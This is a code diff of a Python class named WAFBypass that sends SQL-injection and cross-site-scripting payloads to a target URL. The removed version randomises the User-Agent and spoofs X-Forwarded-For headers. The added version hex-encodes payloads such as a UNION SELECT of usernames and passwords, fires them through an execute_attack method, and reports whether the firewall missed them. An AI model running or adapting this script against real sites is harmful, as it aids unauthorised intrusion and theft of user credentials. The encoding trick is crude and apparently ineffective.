@@ -1,36 +1,50 @@
 import random
+import string
 import requests
 
 class WAFBypass:
-    def __init__(self, target_url):
+    def __init__(self, target_url, waf_detection_engine):
         self.target_url = target_url
+        self.waf_detection_engine = waf_detection_engine
 
-    def bypass(self):
-        headers = self._generate_random_headers()
-        payload = self._generate_payload()
-        response = requests.get(self.target_url, headers=headers, params={"q": payload})
-        return response.text
-
-    def _generate_random_headers(self):
-        return {
-            "User-Agent": self._random_user_agent(),
-            "X-Forwarded-For": self._random_ip(),
-            "Accept": "application/json"
-        }
-
-    def _random_user_agent(self):
-        user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
-        ]
-        return random.choice(user_agents)
-
-    def _random_ip(self):
-        return '.'.join(str(random.randint(0, 255)) for _ in range(4))
-
-    def _generate_payload(self):
+    def generate_bypass_payload(self):
+        """
+        Generate payload to bypass WAF using encoding and obfuscation techniques.
+        """
         payloads = [
-            "<script>alert('WAF Bypass')</script>",
-            "' OR 1=1 --"
+            "' OR 1=1 --",
+            "<script>alert('XSS')</script>",
+            "UNION SELECT null, username, password FROM users --"
         ]
-        return random.choice(payloads)
+        chosen_payload = random.choice(payloads)
+        encoded_payload = self.encode_payload(chosen_payload)
+        return encoded_payload
+
+    def encode_payload(self, payload):
+        """
+        Apply encoding techniques to bypass WAF.
+        """
+        # Encode the payload in hexadecimal or other encoding
+        encoded_payload = ''.join([hex(ord(c))[2:] for c in payload])
+        return encoded_payload
+
+    def send_payload(self, encoded_payload):
+        """
+        Send the encoded payload to the target.
+        """
+        params = {'input': encoded_payload}
+        try:
+            response = requests.get(self.target_url, params=params)
+            if "error" not in response.text:
+                print(f"Payload bypassed WAF: {encoded_payload}")
+            else:
+                print(f"WAF detected attack with payload: {encoded_payload}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error sending payload: {e}")
+
+    def execute_attack(self):
+        """
+        Execute the WAF bypass attack.
+        """
+        encoded_payload = self.generate_bypass_payload()
+        self.send_payload(encoded_payload)
